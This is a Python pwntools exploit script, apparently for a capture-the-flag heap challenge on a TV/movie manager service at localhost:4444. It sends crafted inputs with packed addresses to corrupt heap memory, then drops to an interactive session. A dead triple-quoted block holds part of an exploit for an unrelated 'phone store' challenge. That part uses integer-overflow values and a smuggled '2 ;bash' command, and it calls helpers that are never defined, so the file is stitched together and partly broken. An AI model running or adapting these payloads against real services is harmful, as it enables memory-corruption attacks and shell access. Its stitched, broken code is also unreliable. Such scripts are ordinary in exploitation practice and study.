from pwn import *
from struct import unpack, pack
 
# r = process('./wrapper.sh')
r = remote('localhost', 4444)
 
# Go to modify menu

#create Tv
r.sendlineafter('Your choice? ', '1')
r.sendlineafter("TV name?",  'a'*63)
r.sendlineafter("Season?",  '1'*15)
r.sendlineafter("Rating?",  '1'*15)
r.sendlineafter("TV introduction?",  '1'*127)
'''
#create movie
r.sendlineafter('Your choice? ', '2')
r.sendlineafter("Movie name?",  'a'*63)
r.sendlineafter("Actors",  '12345678')
r.sendlineafter("Rating?",  '1'*15)
r.sendlineafter("Movie introduction?",  '1'*127)
'''
r.sendlineafter('Your choice? ', '1')
r.sendlineafter("TV name?",  'a'*63) 
r.sendlineafter("Season?",  '1'*15) 
r.sendlineafter("Rating?",  '1'*15) 
r.sendlineafter("TV introduction?",  '1'*127)
#create Tv
r.sendlineafter('Your choice? ', '1')
r.sendlineafter("TV name?",  'a'*63) 
r.sendlineafter("Season?",  '1'*15) 
r.sendlineafter("Rating?",  '1'*15) 
r.sendlineafter("TV introduction?",  '1'*127)
#delete
r.sendlineafter("Your choice?",'3')
r.sendlineafter("TV/Movie name to remove?",'a' *63)


#r.interactive()
r.sendlineafter('Your choice? ', '2')
r.sendlineafter("Movie name?",  'b'*63)
r.sendlineafter("Actors", pack('Q',0x00000000004015b0)+ 'b'*63 + '\x00' + 127 * 'c'+'\x00' + pack('Q',0x10) + pack('Q',0x000000601c29) )
#'z'*71 + '\x00' + 'cccccccc')
r.sendlineafter("Rating?",  '1'*15)
r.sendlineafter("Movie introduction?",  '1'*127)

r.sendlineafter("Your choice?",'3')
r.sendlineafter("TV/Movie name to remove?",'b' *55)
gdb.attach(r)
r.interactive()
'''
#raw_input() 
# Add a phone
r.sendlineafter('Your choice? ', 'a')
r.sendlineafter("Phone's name? ", eat(31))
r.sendlineafter("Choose Phone's OS? ", "4")
r.sendlineafter("Phone's price? ", "-2139623424")
r.sendlineafter("Phone's description? ", eat(79))
 
# Malloc the store string
r.sendlineafter('Your choice? ', 'c')
 
# Add more phones
for _ in range(15):
    print _
    r.sendlineafter('Your choice? ', 'a')
    r.sendlineafter("Phone's name? ", eat(31))
    r.sendlineafter("Choose Phone's OS? ", "4")
    r.sendlineafter("Phone's price? ", "-4294905888")
    r.sendlineafter("Phone's description? ", eat(79))
 
print 100000 - len(saved[0])
 
# Malloc the store string
r.sendlineafter('Your choice? ', 'c')
 
# gdb.attach(r, '''
'''
# b *0x08048F6B
# c
# '''
''')
 
# Return to main manu
r.sendlineafter('Your choice? ', 'd')
raw_input() 
# Try store
r.sendlineafter('Your choice? ', 'b')
 
# Use the overflowed item
r.sendlineafter('What do you want to buy? ', '2')
 
# wholesale 10
r.sendlineafter('Your choice? ', 'b')
r.sendlineafter('How many do you plan to buy? ', str(0x0804B280 - len("Blackberry OS Phone a price: -2147483648 CNY description: ")) + ' AAAA')
 
# Return
r.sendlineafter('Your choice? ', 'c')
 
# Go in again
r.sendlineafter('Your choice? ', 'b')
 
# Buy 2!
r.sendlineafter('What do you want to buy? ', '1')
r.sendlineafter('Your choice? ', 'a')
r.sendlineafter('Hey rich man! How many do you want to buy? ', '2 ;bash')
 
r.interactive()
# # pause()
 
# r.interactive()
'''
